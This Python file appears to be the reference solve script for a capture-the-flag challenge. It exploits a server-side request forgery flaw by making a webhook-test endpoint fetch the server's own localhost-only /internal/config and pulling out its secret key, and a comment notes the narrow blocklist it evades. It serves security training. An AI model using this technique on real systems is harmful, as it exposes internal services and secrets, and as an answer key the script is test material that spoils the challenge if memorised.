#!/usr/bin/env python3
"""
WebhookProxy — Reference solve script
Vulnerability: Server-Side Request Forgery (SSRF)

The /internal/config endpoint only responds to 127.0.0.1.
The /api/webhook/test endpoint fetches arbitrary URLs on behalf of the server.
We make the server fetch itself.

Usage:
    python solve.py <host> [port]
    python solve.py localhost 8081
"""

import sys
import json
import urllib.request
import urllib.error


def post_json(url, payload):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = sys.argv[2] if len(sys.argv) > 2 else "8081"

    base = f"http://{host}:{port}"
    print(f"[*] Target: {base}")

    # Step 1 — Verify the service is up
    print("\n[1] Checking service status...")
    with urllib.request.urlopen(f"{base}/api/status", timeout=5) as resp:
        status = json.loads(resp.read())
    print(f"[+] Service: {status}")

    # Step 2 — Confirm /internal/config is blocked from outside
    print("\n[2] Attempting direct access to /internal/config (should fail)...")
    try:
        req = urllib.request.Request(f"{base}/internal/config")
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = json.loads(resp.read())
        print(f"[?] Unexpected success: {body}")
    except urllib.error.HTTPError as e:
        print(f"[+] Correctly blocked: HTTP {e.code} — {e.read().decode()}")

    # Step 3 — SSRF: make the server fetch its own /internal/config
    print("\n[3] Sending SSRF payload via /api/webhook/test...")
    # The server receives our request and makes an internal fetch from 127.0.0.1
    # The blocklist only blocks 169.254.169.254, metadata.google, metadata.internal
    ssrf_url = "http://127.0.0.1/internal/config"
    print(f"    SSRF URL: {ssrf_url}")
    result = post_json(f"{base}/api/webhook/test", {"url": ssrf_url})
    print(f"[+] Webhook test response: {json.dumps(result, indent=2)}")

    # Step 4 — Parse the body (it's JSON returned as a string)
    body_str = result.get("body", "{}")
    try:
        config = json.loads(body_str)
        flag = config.get("secret_key", "")
        if flag:
            print(f"\n[FLAG] {flag}")
        else:
            print(f"\n[?] Full config: {json.dumps(config, indent=2)}")
    except json.JSONDecodeError:
        print(f"\n[?] Raw body: {body_str}")

    # Alternative: try localhost instead of 127.0.0.1
    if not result.get("body"):
        print("\n[3b] Retrying with localhost...")
        result2 = post_json(f"{base}/api/webhook/test", {"url": "http://localhost/internal/config"})
        print(f"[+] Result: {json.dumps(result2, indent=2)}")


if __name__ == "__main__":
    main()
